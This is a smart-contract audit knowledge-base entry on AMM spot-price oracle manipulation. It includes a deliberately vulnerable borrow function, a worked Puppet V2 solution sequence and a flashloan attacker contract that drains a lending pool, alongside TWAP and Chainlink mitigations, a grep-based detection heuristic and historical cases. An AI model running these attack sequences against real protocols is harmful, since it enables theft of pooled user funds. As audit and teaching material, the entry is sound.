# Pattern: Oracle Spot Price AMM Manipulation

Protocol reads raw spot price from AMM (getReserves/slot0); attacker
with sufficient capital vs pool liquidity crashes the price in one
swap, collapsing collateral/mint requirements.

**Family:** Oracle / Price Manipulation
**Exploitation chain:** [optional wrap ETH] → massive token→collateral swap → oracle reads the manipulated price → borrow/mint for almost nothing → drain

**Reference example:** Damn Vulnerable DeFi v4 — Puppet V2; bZx, Harvest, Mango Markets (production)
**Severity when present:** Critical (total drain of the lending pool / vault / position)
**Detection by Slither/Aderyn:** NO
**Solodit tags:** oracle, price-manipulation, amm, uniswap, spot-price, twap, getReserves, slot0, quote, price-oracle-manipulation

---

## Core mechanism

An oracle that returns `reserveB / reserveA` (Uniswap V2 `quote()`) or
`sqrtPriceX96` (Uniswap V3 `slot0`) reflects the instantaneous state of the pool —
a state that any agent can modify within the same block by making a
large enough swap.

The critical condition is not that the protocol uses an AMM as an oracle (many do it
correctly with a TWAP). The condition is that it uses the **spot price** — the reserve
ratio in the current block, with no time window.

If the attacker's capital is comparable to or larger than the pool's liquidity, the swap
will move the price enough for the required collateral to fall to a value
the attacker can pay, letting them drain the protocol.

Key ratio: `attacker_capital / pool_liquidity`. The higher this ratio:
- the smaller the collateral surplus needed for the manipulation
- the larger the percentage the price can be moved
- the lower the cost of the manipulation (in terms of accepted slippage)

With a flashloan, the attacker's capital is theoretically unlimited — the only limit
is the liquidity of the pool being manipulated.

---

## Minimal vulnerable pattern

```solidity
// VULNERABLE: reads the spot price, not a TWAP
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reserveWETH, uint256 reserveToken) =
        UniswapV2Library.getReserves(factory, weth, token);  // ← stored slots
    return UniswapV2Library.quote(amount * 1e18, reserveToken, reserveWETH); // ← spot ratio
}

function calculateDepositRequired(uint256 borrowAmount) public view returns (uint256) {
    return _getOracleQuote(borrowAmount) * COLLATERAL_FACTOR / 1e18;
}

function borrow(uint256 amount) external {
    uint256 deposit = calculateDepositRequired(amount);
    collateral.transferFrom(msg.sender, address(this), deposit); // pays manipulated price
    token.transfer(msg.sender, amount);                           // receives full value
}
```

The Uniswap V2 pair plays two roles at once:
- The price source the lending pool queries
- A public AMM that any participant with enough capital can move

It is not a "circularity" in a structural sense — it is an inherent property of using
a public AMM as an oracle: the state being read is writable by any external
agent. Whether the attacker manipulates the same pool the oracle reads or
another pool that affects it indirectly (cross-pool routing), the condition holds. The
choice of which pool to manipulate is simply the most efficient one in terms of slippage /
required liquidity — not a structural requirement.

---

## Required conditions

Two conditions must hold simultaneously:

1. **The oracle reads the AMM spot price** — `getReserves()` + `quote()` (V2) or `slot0()`
   + `FullMath.mulDiv` (V3), without accumulating historical price.

2. **Attacker capital ≥ manipulation threshold** — depends on the pool's liquidity.
   In DVT/WETH with 100e18 DVT and 10e18 WETH: 10,000 DVT (100× the liquidity) crashes it -99.3%.
   In production with deeper pools, a flashloan can supply the capital.

Condition 2 can be met with own capital (if the ratio is ≥10×) or via a
flashloan (on Aave, Balancer, or the protocol itself if it has a lendable pool).

---

## Canonical exploitation

### Simple case (own capital, no attacker contract — Puppet V2)

```solidity
// Direct sequence of EOA calls:
weth.deposit{value: 20e18}();

address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);
token.approve(address(router), 10_000e18);
router.swapExactTokensForTokens(10_000e18, 1, path, player, block.timestamp);
// → oracle price DVT crashes ~99.3%

uint256 deposit = pool.calculateDepositRequired(1_000_000e18); // now ~29.5 WETH
weth.approve(address(pool), deposit);
pool.borrow(1_000_000e18);
token.transfer(recovery, 1_000_000e18);
```

**No attacker contract.** The manipulation persists in the pair's slots until the
next sync (next swap), so no cross-call atomicity within a single
transaction is required. A sequence of calls in the same session is enough.

### Flashloan case (high-liquidity pool)

```solidity
contract OracleManipulationAttacker is IERC3156FlashBorrower {
    function attack() external {
        flashloanPool.flashLoan(this, address(attackToken), flashloanPool.maxFlashLoan(attackToken), "");
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external returns (bytes32)
    {
        // 1. Massive swap to crash the oracle
        IERC20(token).approve(address(router), amount);
        router.swapExactTokensForTokens(amount, 1, path, address(this), block.timestamp);

        // 2. Borrow at the manipulated price
        uint256 deposit = lendingPool.calculateDepositRequired(DRAIN_AMOUNT);
        collateral.approve(address(lendingPool), deposit);
        lendingPool.borrow(DRAIN_AMOUNT);

        // 3. Repay the flashloan
        IERC20(token).approve(address(flashloanPool), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

With a flashloan, atomicity is required (repayment happens at the end of the callback).
The borrow and the swap must happen inside the same callback so the
manipulated price is visible to the lending pool.

---

## Mitigations

### Correct fix: TWAP

```solidity
// Uniswap V2 TWAP: accumulates price * time on every block
// price0CumulativeLast is updated on every sync
// The TWAP over the window [t0, t1] = (cumulative[t1] - cumulative[t0]) / (t1 - t0)

function _getTWAPPrice(uint256 amount) private view returns (uint256) {
    // Use OZ UniswapV2OracleLibrary or your own implementation with a window ≥30 min
    // In production: window ≥1 hour (Uniswap's recommendation)
}
```

Manipulating a 30-min TWAP requires holding the manipulated price for the whole
period — tying up capital and exposing the attacker to arbitrage on every block.
The attack cost scales linearly with the time window and the pool's depth.

### Alternative fix: Chainlink with a freshness check

```solidity
function _getChainlinkPrice() private view returns (uint256) {
    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    require(updatedAt + STALENESS_THRESHOLD > block.timestamp, "Stale price");
    require(price > 0, "Invalid price");
    return uint256(price);
}
```

It fully decouples the oracle from the AMM the attacker can manipulate. The risk
shifts to trust in Chainlink and to the handling of downed feeds.

### Additional mitigation: sanity bounds (not sufficient on its own)

```solidity
uint256 spot = _getSpotPrice();
require(spot >= lastPrice * 90 / 100 && spot <= lastPrice * 110 / 100, "Price deviation");
```

A circuit breaker can mitigate extreme manipulations (>10%) but not gradual
attacks over multiple transactions. It is not a definitive fix — only an additional layer.

### NOT a fix: nonReentrant

`nonReentrant` does not solve the problem. The vector is not reentrancy — the protocol
simply reads a manipulated price. The pool can read the price in a block
after the swap without any reentrancy.

---

## Detection heuristic

Grep in `public`/`external` functions that compute collateral, mint ratios or prices:

```bash
grep -rn "getReserves\|slot0\|getAmountsOut\|quote(" src/ --include="*.sol"
```

Red flags in code review:

- The oracle function calls `IUniswapV2Pair.getReserves()` directly
- The oracle function calls `IUniswapV3Pool.slot0()` (V3)
- No reference to `price0CumulativeLast`, `price1CumulativeLast` or `blockTimestampLast` in the oracle
- No reference to Chainlink `AggregatorV3Interface`, `latestRoundData()`
- The function that reads the price is `private view` and is called by borrow/mint/liquidate functions

Key question: **"What prevents someone from moving this price in the borrow's block?"**
If the answer is "nothing" or "the swap's slippage" (not a time window), it is vulnerable.

Additional question: **"How much capital does an attacker need to move the price X%?"**
Model it with the constant product formula: if `attacker_capital >> pool_liquidity`, it is trivial.

---

## Cross-references

### Historical canon

See [../historical-exploits.md](../historical-exploits.md):

- **bZx (2020, $8M)** — flash loan → Uniswap spot price manipulation → inflated Compound borrow.
  First publicly documented instance of the complete pattern.
- **Harvest Finance (2020, $24M)** — flash loan → Curve spot price manipulation → stablecoin vault drained.
  Larger liquidity scale; same mechanism.
- **Mango Markets (2022, $114M)** — self-manipulation of the protocol's own price oracle.
  Variant: the attacker controls both sides, the pair and the protocol position.

It is the pattern with the most production prior art in this knowledge base.

### MEV / Flashloan patterns

See [../mev-flashloan-patterns.md](../mev-flashloan-patterns.md):

- Pattern 1 "Oracle manipulation → inflated mint/borrow" — describes exactly this family.
  The pattern here adds the capital ratio formula and the detection indicators specific
  to Uniswap V2/V3.

### Meta-family: "Validation without context"

This pattern shares a conceptual family with:
- [governance-current-votes-flashloan.md](governance-current-votes-flashloan.md) — validation ignores the timing of voting power
- [flashloan-repayment-balance-conflation.md](flashloan-repayment-balance-conflation.md) — validation ignores the source of the funds
- [erc4626-totalassets-balanceof.md](erc4626-totalassets-balanceof.md) — validation ignores the source/separation of balances

The difference: in this pattern, the protocol ignores that the **spot price is manipulable**
— there is no temporal or source context that rescues the validation. The price feed ITSELF is the
problem, not the code that reads it. The fix requires changing the price source, not the
validation code.

Do NOT merge with the above — the root vulnerability and the fix are different.

### Known instances

| Instance | Date | Ref |
|-----------|-------|-----|
| Damn Vulnerable DeFi v4 — Puppet V2 | — | training challenge |
| bZx | 2020 (production) | [historical-exploits.md](../historical-exploits.md) |
| Harvest Finance | 2020 (production) | [historical-exploits.md](../historical-exploits.md) |
| Mango Markets | 2022 (production) | [historical-exploits.md](../historical-exploits.md) |

## Defensive reinforcement — what a CORRECT oracle-anchored DEX looks like

A DEX whose price follows the oracle (no internal price discovery), where all the manipulation risk
lives in the oracle/band layer. A "positive" reference (taken from an audit of this kind of DEX)
for detecting the ABSENCE of these pieces in the next oracle-anchored one. Careful: having these pieces
does not close the family — see OL-14 (quantization) and OL-13 (guards) in `prompts/operational-lessons.md`:
- **The band clamp ONLY widens (pool-safe).** `bidOut = min(refBid, cBid)`, `askOut = max(refAsk, cAsk)`:
  a source/curator can only quote WIDER than the band (worse for the trader, safe for
  the LP), never narrower. If you see `clamp(cBid, refBid, refAsk)` (clip INSIDE) or min/max the
  wrong way round → a source could quote more aggressively than the band = LP loss. **Verify the direction.**
- **The band bound is enforced at CONSTRUCTION, not assumed.** `maxSpreadBps·ONE_BPS_E18 + minMargin
  < BPS_BASE_U` via `revert BandTooWide()` in the constructor + a `spreadBps > MAX_SPREAD_BPS` circuit breaker
  before computing `half` → `BPS_BASE_U − half` never underflows. A "< X by construction" comment
  WITHOUT the corresponding require = the bug. **Look for the require that backs the "by construction".**
- **Fail-closed on EVERY out-of-range field:** any failure (stale, mid==0, spread≥marker,
  overflow, invalid source) → sentinel `(0, uint128.max)` → revert, NEVER an accepted bad price.
- **Mint/seigniorage oracle: cumulative TWA + caps** (e.g. time-weighted `readCumulativeReserves` +
  a per-period delta cap) → a flashloan does not move a season-long TWA. Instantaneous = manipulable.
